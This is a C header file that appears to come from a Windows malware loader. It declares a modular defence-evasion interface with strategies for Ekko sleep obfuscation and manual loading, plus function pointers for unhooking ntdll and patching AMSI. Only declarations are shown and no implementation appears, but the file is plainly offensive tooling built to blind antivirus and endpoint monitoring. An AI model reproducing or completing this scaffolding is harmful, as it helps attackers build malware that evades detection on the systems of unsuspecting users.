#ifndef STRATEGY_H
#define STRATEGY_H

#include "common_defines.h"

// Forward declaration to avoid circular dependency
struct _RTLDR_CTX;

// Evasion strategy types
typedef enum _STRATEGY_TYPE {
    STRATEGY_EKKO = 1,
    STRATEGY_MANUAL_LOAD = 2,
    STRATEGY_COMBINED = 3,
} STRATEGY_TYPE;

// Function pointer types for modular evasion strategies
typedef BOOL (*pfnInitialize)(struct _RTLDR_CTX* ctx);
typedef BOOL (*pfnObfuscateSleep)(struct _RTLDR_CTX* ctx, DWORD dwMilliseconds);
typedef BOOL (*pfnUnhookNtdll)(struct _RTLDR_CTX* ctx);
typedef BOOL (*pfnPatchAMSI)(struct _RTLDR_CTX* ctx);
typedef BOOL (*pfnCleanup)(struct _RTLDR_CTX* ctx);

// Enhanced modular evasion strategy structure
typedef struct _EVASION_STRATEGY {
    // Strategy metadata
    const char* szStrategyName;
    DWORD dwVersion;
    STRATEGY_TYPE type;
    
    // Core function pointers
    pfnInitialize       pfnInitialize;
    pfnObfuscateSleep   pfnObfuscateSleep;
    pfnUnhookNtdll      pfnUnhookNtdll;
    pfnPatchAMSI        pfnPatchAMSI;
    pfnCleanup          pfnCleanup;
    
    // Strategy-specific data pointer
    PVOID strategy_data;
} EVASION_STRATEGY, *PEVASION_STRATEGY;


// Function to initialize the strategy structure with the chosen techniques.
BOOL Strategy_Initialize(struct _RTLDR_CTX* ctx, PEVASION_STRATEGY strategy);

// Strategy loader functions
BOOL Strategy_LoadEkko(PEVASION_STRATEGY pStrategy);
BOOL Strategy_LoadManualLoader(PEVASION_STRATEGY pStrategy);

// Advanced strategy functions
BOOL Strategy_LoadCombined(PEVASION_STRATEGY pStrategy, STRATEGY_TYPE primary, STRATEGY_TYPE secondary);


#endif // STRATEGY_H 